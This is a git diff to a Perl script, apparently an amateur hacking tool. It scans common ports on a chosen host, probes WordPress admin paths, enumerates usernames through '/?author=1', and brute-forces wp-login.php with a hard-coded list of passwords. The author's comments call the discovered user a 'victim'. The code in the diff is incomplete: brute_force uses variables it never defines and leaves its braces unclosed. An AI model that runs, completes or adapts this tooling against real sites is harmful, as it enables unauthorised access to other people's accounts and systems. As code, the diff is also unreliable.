@@ -21,6 +21,7 @@ use HTTP::Cookies;
 use LWP::Protocol::https;
 use Term::ANSIColor;
 use Net::DNS;
+use HTML::HeadParser;
 ###########################
 #External modules (trying to avoid using)
 ###########################
@@ -57,39 +58,38 @@ chomp(my $host = <STDIN>);
 #print "\n\n[*]Enter the path to the list of passwords => ";
 #chomp(my $pass = <STDIN>);
 #####################################
-#Info gathering: Port scanner
-sleep(2);
-print "++++++++++++++++++++++++++++++\n\n";
-print "[*]Trying to connect to common ports\n";
-print "++++++++++++++++++++++++++++++\n\n";
-print color('reset');
-sleep(2);
-
-#looks for ports in the array
-#to add: array of open ports
-foreach my $port (@ports){
-    if($sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => 'tcp', Timeout => 1)){
-        print color('green');
-        print "[*] =>\tPort $port is open\n";
-        print color('reset');
-        push @oports, $port; #pushing the open port to an array for later use
+#Running subroutines
+port_scanner();
+admin_find();
+user_find();
+#####################################
+#Start subroutine building
+####
+#Port scanner
+sub port_scanner {
+  print "\n\n++++++++++++++++++++++++++++++\n";
+  print "[*]Port scan\n";
+  print "++++++++++++++++++++++++++++++\n";
+  print color('reset');
+  #looks for ports in the array
+  foreach my $port (@ports){
+      if($sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => 'tcp', Timeout => 1)){
+          print color('green');
+          print "[*] =>\tPort $port is open\n";
+          print color('reset');
+          push @oports, $port; #pushing the open port to an array for later use
       }
       else{
         print color('red');
         print "[*] =>\tPort $port is closed\n";
         print color('reset');
-      }
     }
-
-#####################################
-#Running subroutines
-brute_force();
-#####################################
-#Start subroutine building
+  }
+}
 ####
 #Finding admin pages
 sub admin_find {
-  print color('yellow');
+ print color('yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Hunting for an admin page\n";
  print "++++++++++++++++++++++++++++++++++\n";
@@ -97,7 +97,6 @@ sub admin_find {
 #array of typical admin pages
  my @admins = qw(admin administrator wp-admin wp-login.php);
   if ($host !~ /http:\/\//) {$host = "http://$host";}; #adds http before the target if it is not present
-
   foreach my $admin (@admins) {
 	 my $hunt = $host."/".$admin."/";
 	 my $req = HTTP::Request->new(GET=>$hunt); #sends a GET request for the pages
@@ -120,33 +119,50 @@ sub admin_find {
   }
 }
 ####
+#WordPress user discovery
+sub user_find {
+  print color('yellow');
+  print "++++++++++++++++++++++++++++++++++\n";
+  print "[*]Looking for a user\n";
+  print "++++++++++++++++++++++++++++++++++\n";
+  print color('reset');
+  my $user = $host . '/?author=1'; #the /?author=1 will lead to a public facing list of users
+  my $req = HTTP::Request ->new(GET=>$user); #build a request to get page content
+  my $userhunt = $bot->request($req)->content; #sends the request then decodes the content so it doesn't load a hash
+  if($userhunt =~/<title>([a-zA-Z\/][^>]+)<\/title>/){ #filtering for the username in the pages title
+    my $victim = $1;
+    print color('green');
+    print "[*]Found user\n";
+    print color('bold green');
+    print "[*] =>\t$victim \n";
+    brute_force();
+  }
+  else{
+    print color('red');
+    print "[*]Unable to find a user\n";
+    print color('reset');
+  }
+}
+
+
 #Admin Page Brute force //Needs to be adjusted//Will be coming back to
 sub brute_force {
-  my @users = qw(admin root administrator user login security person); #support for file reading coming soon
   my @passwds = qw(password 123 admin admin123 BTekgFutvcx1L%9pbN); #support for file reading coming soon
-  my $target = admin_find(); #Sets the variable to the returned value from the admin_find function
+
   print color('yellow');
   print "++++++++++++++++++++++++++++++++++\n";
   print "[*]Trying to break the login\n";
   print "++++++++++++++++++++++++++++++++++\n";
   print color('reset');
   #Iterating through the two arrays to try and guess the username and password
-  foreach (@users) {
-    chomp(my $user = $_);
-    foreach (@passwds) {
+  foreach (@passwds) {
       chomp(my $passwd = $_);
-      my $login = $bot-> post($target, log => $user, pwd => $passwd);
-      #still does not work, it will count all of the requests as success since it returns status code 200.
-      #have to get the filter correct to determine the correct username/password combo
-      if ($login -> is_success){
-        print color('green');
-        print "[*]Broke dat bitch!\n\t[*]User => " . $user . "\n\t[*]Password => " . $passwd . "\n";
-        print color('reset');
-        print "++++++++++++++++++++++++++++++++++\n";
-      }
-    }
-  }
-}
+      
+      my $login = $bot-> post($target, log => $user, pwd => $passwd)->as_string;
+      my $target = $host . '/wp-login.php';
+      my $auth = $host . '/wp-admin/';
+
+
 ####
 #Maybe XSS or SQL, don't know yet
 
@@ -154,3 +170,7 @@ sub brute_force {
 ####
 #FTP brute forcing
 sub ftp_brute {}
+
+
+####
+#FTP commands
